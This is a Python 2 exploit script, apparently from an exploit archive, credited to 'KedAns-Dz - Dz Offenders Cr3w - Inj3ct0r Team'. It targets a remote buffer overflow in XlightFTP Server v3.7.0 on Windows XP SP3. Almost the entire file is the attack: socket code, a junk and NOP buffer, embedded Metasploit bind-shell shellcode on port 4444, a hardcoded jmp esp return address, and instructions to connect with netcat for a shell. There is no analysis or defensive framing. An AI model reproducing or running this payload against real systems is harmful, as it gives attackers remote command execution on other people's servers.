#!/usr/bin/python

from socket import *
import sys, struct, os, time

print "\nXlightFTP Server v3.7.0 Remote Root BOF Exploit"
if (len(sys.argv) < 3):
	print "\nXlightFTP Server v3.7.0 Remote Root BOF Exploit"
        print "\n	Usage: %s <host> <port> \n" %(sys.argv[0])
	sys.exit()

print "\n[!] Connecting to %s ..." %(sys.argv[1])

# connect to host
sock = socket(AF_INET,SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))
sock.recv(1024)
time.sleep(5)
#-------------------------------------------
buffer = "\x41" * 1337 # Junk
buffer += "\x90" * 123 # padding
#-------------------------------------------
# windows/shell_bind_tcp - 368 bytes
# Encoder: x86/shikata_ga_nai (http://www.metasploit.com)
# LPORT=4444, RHOST=192.168.1.2, EXITFUNC=process
buffer += ("\x33\xc9\xbf\xb8\xf7\xfd\xd9\xda\xd8\xd9\x74\x24\xf4\xb1"+
"\x56\x5d\x83\xc5\x04\x31\x7d\x0d\x03\x7d\xb5\x15\x08\x25"+
"\x2d\x50\xf3\xd6\xad\x03\x7d\x33\x9c\x11\x19\x37\x8c\xa5"+
"\x69\x15\x3c\x4d\x3f\x8e\xb7\x23\xe8\xa1\x70\x89\xce\x8c"+
"\x81\x3f\xcf\x43\x41\x21\xb3\x99\x95\x81\x8a\x51\xe8\xc0"+
"\xcb\x8c\x02\x90\x84\xdb\xb0\x05\xa0\x9e\x08\x27\x66\x95"+
"\x30\x5f\x03\x6a\xc4\xd5\x0a\xbb\x74\x61\x44\x23\xff\x2d"+
"\x75\x52\x2c\x2e\x49\x1d\x59\x85\x39\x9c\x8b\xd7\xc2\xae"+
"\xf3\xb4\xfc\x1e\xfe\xc5\x39\x98\xe0\xb3\x31\xda\x9d\xc3"+
"\x81\xa0\x79\x41\x14\x02\x0a\xf1\xfc\xb2\xdf\x64\x76\xb8"+
"\x94\xe3\xd0\xdd\x2b\x27\x6b\xd9\xa0\xc6\xbc\x6b\xf2\xec"+
"\x18\x37\xa1\x8d\x39\x9d\x04\xb1\x5a\x79\xf9\x17\x10\x68"+
"\xee\x2e\x7b\xe5\xc3\x1c\x84\xf5\x4b\x16\xf7\xc7\xd4\x8c"+
"\x9f\x6b\x9d\x0a\x67\x8b\xb4\xeb\xf7\x72\x36\x0c\xd1\xb0"+
"\x62\x5c\x49\x10\x0a\x37\x89\x9d\xdf\x98\xd9\x31\x8f\x58"+
"\x8a\xf1\x7f\x31\xc0\xfd\xa0\x21\xeb\xd7\xd7\x65\x25\x03"+
"\xb4\x01\x44\xb3\x2b\x8e\xc1\x55\x21\x3e\x84\xce\xdd\xfc"+
"\xf3\xc6\x7a\xfe\xd1\x7a\xd3\x68\x6d\x95\xe3\x97\x6e\xb3"+
"\x40\x3b\xc6\x54\x12\x57\xd3\x45\x25\x72\x73\x0f\x1e\x15"+
"\x09\x61\xed\x87\x0e\xa8\x85\x24\x9c\x37\x55\x22\xbd\xef"+
"\x02\x63\x73\xe6\xc6\x99\x2a\x50\xf4\x63\xaa\x9b\xbc\xbf"+
"\x0f\x25\x3d\x4d\x2b\x01\x2d\x8b\xb4\x0d\x19\x43\xe3\xdb"+
"\xf7\x25\x5d\xaa\xa1\xff\x32\x64\x25\x79\x79\xb7\x33\x86"+
"\x54\x41\xdb\x37\x01\x14\xe4\xf8\xc5\x90\x9d\xe4\x75\x5e"+
"\x74\xad\x86\x15\xd4\x84\x0e\xf0\x8d\x94\x52\x03\x78\xda"+
"\x6a\x80\x88\xa3\x88\x98\xf9\xa6\xd5\x1e\x12\xdb\x46\xcb"+
"\x14\x48\x66\xde")
#-------------------------------------
buffer += "\x90" * 8 # more nop's
#-------------------------------------
buffer += "\x07\xd5\xc5\x7c" # jmp esp in shell32.dll (Windows XP SP3 - Universal)
buffer += "\x0a" # end connection 
# send buffer
print "[*] Sending Buffer Junk..."
time.sleep(2)
print "[*] Spawn a Backshell Connecting..."
sock.send(buffer)
sock.recv(1024)
sock.close()
print "[+] Exploit succeed. Now NetCat %s on port 4444\n" %(sys.argv[1])
print "\n > Exploit By : KedAns-Dz - Dz Offenders Cr3w - Inj3ct0r Team"
sys.exit()
